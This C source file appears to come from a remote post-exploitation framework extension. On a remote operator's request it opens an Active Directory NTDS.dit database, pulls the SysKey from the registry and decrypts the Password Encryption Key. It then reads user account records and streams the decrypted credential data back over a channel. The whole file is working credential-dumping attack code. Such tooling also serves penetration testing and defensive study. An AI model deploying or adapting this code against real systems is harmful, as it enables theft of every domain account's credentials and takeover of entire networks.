/*!
* @file ntds.c
* @brief NTDS channel interface
*/
#include "extapi.h"

#define JET_VERSION 0x0501

#include <inttypes.h>
#include <WinCrypt.h>
#include "syskey.h"
#include "ntds_decrypt.h"
#include "ntds_jet.h"
#include "ntds.h"

/*! @brief Typedef for the NTDSContext struct. */
typedef struct
{
	struct jetState *ntdsState;
	struct ntdsColumns *accountColumns;
	struct decryptedPEK *pekDecrypted;
} NTDSContext;

// This is the raw NTDS command function. When the remote user
// sends a command request for extapi_ntds_parse, this function fires.
// It calls the setup routines for our Jet Instance, attaches the isntance
// to the NTDS.dit database the user specified, and creates our channel.
// The user interacts with the NTDS database through that channel from that point on.
DWORD ntds_parse(Remote *remote, Packet *packet)
{
	Packet *response = packet_create_response(packet);
	DWORD res = ERROR_SUCCESS;
	struct jetState *ntdsState = calloc(1,sizeof(struct jetState));
	PCHAR filePath = packet_get_tlv_value_string(packet, TLV_TYPE_NTDS_PATH);
	// Check if the File exists
	if (0xffffffff == GetFileAttributes(filePath)) {
		res = 2;
		goto out;
	}
	strncpy_s(ntdsState->ntdsPath, 255, filePath, 254);

	// Attempt to get the SysKey from the Registry
	unsigned char sysKey[17];
	if (!get_syskey(sysKey)) {
		res = GetLastError();
		goto out;
	}

	JET_ERR startupStatus = engine_startup(ntdsState);
	if (startupStatus != JET_errSuccess) {
		res = startupStatus;
		goto out;
	}

	// Start a Session in the Jet Instance
	JET_ERR sessionStatus = JetBeginSession(ntdsState->jetEngine, &ntdsState->jetSession, NULL, NULL);
	if (sessionStatus != JET_errSuccess) {
		JetTerm(ntdsState->jetEngine);
		res = sessionStatus;
		goto out;
	}
	JET_ERR openStatus = open_database(ntdsState);
	if (openStatus != JET_errSuccess) {
		JetEndSession(ntdsState->jetSession, (JET_GRBIT)NULL);
		JetTerm(ntdsState->jetEngine);
		res = openStatus;
		goto out;
	}
	JET_ERR tableStatus = JetOpenTable(ntdsState->jetSession, ntdsState->jetDatabase, "datatable", NULL, 0, JET_bitTableReadOnly | JET_bitTableSequential, &ntdsState->jetTable);
	if (tableStatus != JET_errSuccess) {
		engine_shutdown(ntdsState);
		res = tableStatus;
		goto out;
	}

	// Create the structure for holding all of the Column Definitions we need
	struct ntdsColumns *accountColumns = calloc(1, sizeof(struct ntdsColumns));

	JET_ERR columnStatus = get_column_info(ntdsState, accountColumns);
	if (columnStatus != JET_errSuccess) {
		engine_shutdown(ntdsState);
		free(accountColumns);
		res = columnStatus;
		goto out;
	}
	JET_ERR pekStatus;
	struct encryptedPEK *pekEncrypted = calloc(1,sizeof(struct encryptedPEK));
	struct decryptedPEK *pekDecrypted = calloc(1,sizeof(struct decryptedPEK));

	// Get and Decrypt the Password Encryption Key (PEK)
	pekStatus = get_PEK(ntdsState, accountColumns, pekEncrypted);
	if (pekStatus != JET_errSuccess) {
		res = pekStatus;
		free(accountColumns);
		free(pekEncrypted);
		free(pekDecrypted);
		engine_shutdown(ntdsState);
		goto out;
	}
	if (!decrypt_PEK(sysKey, pekEncrypted, pekDecrypted)) {
		res = GetLastError();
		free(accountColumns);
		free(pekEncrypted);
		free(pekDecrypted);
		engine_shutdown(ntdsState);
		goto out;
	}
	// Set our Cursor on the first User record
	JET_ERR cursorStatus = find_first(ntdsState);
	if (cursorStatus != JET_errSuccess) {
		res = cursorStatus;
		free(accountColumns);
		free(pekEncrypted);
		free(pekDecrypted);
		engine_shutdown(ntdsState);
		goto out;
	}
	cursorStatus = next_user(ntdsState, accountColumns);
	if (cursorStatus != JET_errSuccess) {
		res = cursorStatus;
		free(accountColumns);
		free(pekEncrypted);
		free(pekDecrypted);
		engine_shutdown(ntdsState);
		goto out;
	}

	// If we made it this far, it's time to set up our channel
	PoolChannelOps chops;
	Channel *newChannel;
	memset(&chops, 0, sizeof(chops));

	NTDSContext *ctx;
	// Allocate storage for the NTDS context
	if (!(ctx = calloc(1, sizeof(NTDSContext)))) {
		res = ERROR_NOT_ENOUGH_MEMORY;
		free(accountColumns);
		free(pekEncrypted);
		free(pekDecrypted);
		engine_shutdown(ntdsState);
		goto out;
	}

	ctx->accountColumns = accountColumns;
	ctx->ntdsState = ntdsState;
	ctx->pekDecrypted = pekDecrypted;

	// Initialize the pool operation handlers
	chops.native.context = ctx;
	chops.native.close = ntds_channel_close;
	chops.read = ntds_channel_read;
	if (!(newChannel = channel_create_pool(0, CHANNEL_FLAG_SYNCHRONOUS | CHANNEL_FLAG_COMPRESS, &chops)))
	{
		res = ERROR_NOT_ENOUGH_MEMORY;
		free(accountColumns);
		free(pekEncrypted);
		free(pekDecrypted);
		engine_shutdown(ntdsState);
		goto out;
	}

	channel_set_type(newChannel, "ntds");
	packet_add_tlv_uint(response, TLV_TYPE_CHANNEL_ID, channel_get_id(newChannel));

out:
	packet_transmit_response(res, remote, response);
	return ERROR_SUCCESS;
}


// This function reads an individual account record from the database and moves
// the cursor to the next one in the table.
static DWORD ntds_read_into_batch(NTDSContext *ctx, struct ntdsAccount *batchedAccount)
{
	DWORD result = ERROR_SUCCESS;
	JET_ERR readStatus = JET_errSuccess;
	struct ntdsAccount *userAccount = calloc(1, sizeof(struct ntdsAccount));
	readStatus = read_user(ctx->ntdsState, ctx->accountColumns, ctx->pekDecrypted, userAccount);
	if (readStatus != JET_errSuccess) {
		result = readStatus;
	}
	else {
		memcpy(batchedAccount, userAccount, sizeof(struct ntdsAccount));
	}
	free(userAccount);
	return result;
}

// This callback fires when the remote side requests a read from the channel.
// It call ntds_read_into_batch up to 20 times and feeds the results into
// an array which is then written back out into the channel's output buffer
static DWORD ntds_channel_read(Channel *channel, Packet *request,
	LPVOID context, LPVOID buffer, DWORD bufferSize, LPDWORD bytesRead)
{
	JET_ERR readStatus = JET_errSuccess;
	DWORD result = ERROR_SUCCESS;
	NTDSContext *ctx = (NTDSContext *)context;
	struct ntdsAccount batchedAccounts[20];
	DWORD batchSize = 0;

	for (int i = 0; i < 20; i++) {
		readStatus = ntds_read_into_batch(ctx, &batchedAccounts[i]);
		if (readStatus != JET_errSuccess) {
			break;
		}
		batchSize += sizeof(struct ntdsAccount);
		next_user(ctx->ntdsState, ctx->accountColumns);
	}

	memcpy(buffer, batchedAccounts, batchSize);
	*bytesRead = batchSize;

	return ERROR_SUCCESS;
}

// This callback function is responsible for cleaning up when the channel
// is closed. It shuts down the Jet Engine, and frees up the memory
// for all of the context we have been carrying around.
static DWORD ntds_channel_close(Channel *channel, Packet *request,
	LPVOID context)
{
	NTDSContext *ctx = (NTDSContext *)context;
	engine_shutdown(ctx->ntdsState);
	free(ctx->accountColumns);
	free(ctx->pekDecrypted);
	free(ctx);
	return ERROR_SUCCESS;
}
